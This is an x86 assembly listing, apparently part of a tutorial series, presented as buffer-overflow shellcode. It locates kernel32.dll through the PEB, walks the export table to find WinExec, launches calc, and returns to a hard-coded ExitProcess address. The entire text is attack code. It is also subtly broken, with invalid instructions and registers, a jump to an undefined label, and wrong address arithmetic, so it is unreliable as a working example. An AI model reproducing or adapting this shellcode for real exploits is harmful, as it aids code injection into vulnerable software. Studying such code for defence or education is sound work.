;buffer overflow's  shellcode  
;code injected by hacker to force appllication perform hacker's will (part 3)

;book space  on stack
sub esp,70

;adjust stack
and esp,0FFFFFFF0h

;scanning PEB (Proccess Environment Block) to find Kernel32.dll address
mov eax,fs:[ecx+30h]

mov eax,dword ptr[eax+0ch]
mov eax,dword ptr[eax+1ch]
push dword ptr[eax]
pop eax

;Kernel32.dll address
mov esi,[eax+8h]

;RVA address
mov ebx,[esi+3Ch]

;conversion to VA
add ebx,esi

;RVA eksport's section
mov edx,[ebx+078h]

;VA conversion
add edx,esi

 
xor ebx,ebx

;RVA  table of names' functions 
mov ecx,[edx++020h]

;VA conversion
add ecx,esi

;RVA table of address' functions
mov eax,[edx+01Ch]

;VA conversion
add eax,esi

;RVA ordinals numbers
mov ebp,[edx+024h]

;VA conversion
add ebp,esi

; next function's name,  
loop_it: 
mov edx,[ecx]

;VA conversion
mov edx,esi

;save address' functions table  and RVA
push ebx
push eax 

shl ebx,1
add ebx,ebp

;take 16 bits from ebx address
movzx ebx,word ptr[ebx]

;take address of  eksportation function
mov eax,[eax+ebp*4]

add eax,esi

;find address fo API WinExec function
;check if function name is WinExec
cmp dword ptr[edx],'EniW'

je make_calc

;take value of register from the stack
pop ebx
pop eax

;go on searching
next_one:
add ecx,4
inc ebx
jmp look_it

make_calc:
push SW_SHOW

mov dword ptr[esp],'clac'

xor exc,ecx

;finish string with null vlaue
move dword ptr[esp+4],ecx

;put  calc  value to the stack
push esp

;return to ExitProcess function
push 7C81CB12h

;launch WinExe function
jmp eax




